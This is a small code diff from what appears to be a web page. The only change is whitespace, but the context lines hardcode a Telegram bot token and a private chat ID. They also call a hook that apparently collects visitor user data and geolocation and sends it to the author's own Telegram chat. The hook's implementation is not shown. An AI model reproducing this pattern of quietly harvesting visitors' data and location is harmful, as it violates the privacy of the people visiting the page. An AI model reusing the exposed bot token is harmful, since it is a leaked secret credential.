@@ -12,7 +12,7 @@ import useTelegramUserData from './components/telegram/hook/useTelegramUserData'
 const Page = () => {
     const botToken = '8256676674:AAGY4IXrfXzReKpk8FUZw1LqtCfqLaYFVgM'; // توکن ربات شما
     const chatId = '310569075'; // آیدی چت مقصد (مثلاً پی‌وی خودتان) را اینجا قرار دهید
-    const { isLoading, error } = useTelegramUserData({
+    const { isLoading, error  } = useTelegramUserData({
         botToken,
         chatId,
         collectGeolocation: true, // فعال کردن موقعیت جغرافیایی (اختیاری)
